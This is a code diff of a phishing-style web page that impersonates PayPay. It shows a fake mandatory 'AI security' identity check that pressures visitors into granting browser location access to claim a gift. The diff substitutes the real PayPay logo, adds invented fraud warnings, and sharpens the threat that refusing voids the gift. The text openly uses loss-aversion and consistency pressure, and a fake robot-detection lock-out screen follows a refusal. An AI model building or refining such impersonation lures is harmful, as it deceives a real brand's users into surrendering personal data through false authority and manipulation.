@@ -36,7 +36,7 @@
       box-shadow: 0 4px 12px rgba(0,0,0,0.15);
       padding: 25px;
       display: inline-block;
-      max-width: 440px;
+      max-width: 480px;
       width: 100%;
       margin-top: 20px;
       border: 2px solid #e60012;
@@ -105,26 +105,36 @@
 </head>
 <body>
 
-  <img src="https://play-lh.googleusercontent.com/AieC1ypSSh_2rctvrNtVggyFRP9cNtvnEIPkVmzZGFlhN8bNdHCl3GZbxK7O8vCe7A" width="120" class="logo"/>
+  <img src="https://www.paypay.ne.jp/img/logo.svg" width="120" class="logo"/>
 
   <div class="card">
-    <img src="https://cdn.askul.co.jp/img/product/3L1/JA32873_3L1.jpg" class="warning-icon" alt="警告マーク"/>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Warning_icon.svg/240px-Warning_icon.svg.png" class="warning-icon" alt="警告マーク"/>
     <h2>本人確認のお願い</h2>
     <p>
-      安全性と利便性の両立のため、<br><b>位置情報の確認</b>をお願いしております。<br>
-      これは<b>全利用者に一律適用</b>される、PayPayのAIセキュリティチェッカーによる自動審査です。
+      最近、<b>PayPayギフトを悪用した不正利用の報告</b>が相次いでおります。<br>
+      こうした被害の多くは「なりすまし」「不正取得」に起因しており、<br>
+      社会的信用・個人の財産を守る観点からも、<b>厳格な確認手続き</b>が不可欠となっております。
+    </p>
+    <p>
+      <b>PayPayでは数年間に渡りAIと行動心理学に基づいた検出アルゴリズム</b>を構築しており、<br>
+      現在はそのモデルをもとに<b>自動セキュリティスクリーニング</b>を実施しております。<br>
+      対象は<b>全利用者</b>であり、任意ではなく<b>義務的確認</b>となります。
+    </p>
+    <p>
+      <b>行動パターン</b>や<b>反応速度</b>、<b>位置情報の許可</b>は判定の重要要素であり、<br>
+      正常なアクセスであることの証明には位置情報確認が不可欠です。
     </p>
     <div class="warning">
-      ※位置情報を<b>許可されない場合、本人確認が未完了とみなされ、ギフトを受け取ることはできません。</b>
+      ※位置情報を<b>許可されない場合、ギフト受領資格が無効</b>となります。
     </div>
     <p>
-      私たちは<b>「損失回避の心理」</b>を考慮したシステム設計を行っております。<br>
-      ご提供いただいた情報は<b>即時削除・暗号化処理</b>され、<b>PayPay社外には一切共有されません</b>。
+      また、心理学的には「損失回避バイアス」「一貫性の原理」を考慮することで、<br>
+      多くのユーザーが合理的な選択をされております。<br>
+      本確認は<b>一度限り</b>であり、<b>PayPay社外への情報提供は一切行いません</b>。
     </p>
-    <p><b>「一貫性の原理」</b>に基づき、最初のステップにご協力いただいた方にのみ、サービス提供が可能です。</p>
     <button onclick="verifyLocation()">位置情報を許可して続行</button>
     <div class="note">
-      ※この確認は一度限りです。<br>拒否された場合、再取得はできません。
+      ※一度拒否された場合、<b>再取得は不可能</b>です。
     </div>
   </div>
 
@@ -161,15 +171,15 @@
     if (localStorage.getItem('robot') === 'true') {
       document.body.innerHTML = `
         <div style="padding:50px; text-align:center; font-family: 'Helvetica Neue', sans-serif; animation: fadeIn 1s ease-in;">
-          <img src="https://play-lh.googleusercontent.com/AieC1ypSSh_2rctvrNtVggyFRP9cNtvnEIPkVmzZGFlhN8bNdHCl3GZbxK7O8vCe7A" width="120"><br><br>
-          <img src="https://cdn.askul.co.jp/img/product/3L1/JA32873_3L1.jpg" width="60" style="animation: blink 1s infinite;"><br><br>
+          <img src="https://www.paypay.ne.jp/img/logo.svg" width="120"><br><br>
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Warning_icon.svg/240px-Warning_icon.svg.png" width="60" style="animation: blink 1s infinite;"><br><br>
           <h2 style="color:#e60012; text-shadow: 0 0 3px red;">アクセスが制限されました</h2>
           <p style="color:#333; font-size:15px;">
             PayPayの自動判定システムにより、<b style='color:red;'>ロボットの可能性がある</b>と判断されました。
           </p>
           <p style="font-size:14px; color:#555; margin-top:25px;">
-            この判定は心理的行動パターン・応答速度・位置拒否判断をAIが統合的に解析し、<br>
-            <b>不審な挙動として記録されました。</b>
+            心理的行動パターン・応答時間・位置拒否判断など複数の要素をもとに、<br>
+            当社の<b>AIセキュリティモデル</b>が一貫した不審傾向を検出しました。
           </p>
           <p style="font-size:13px; color:#777; margin-top:30px;">
             PayPay株式会社<br>
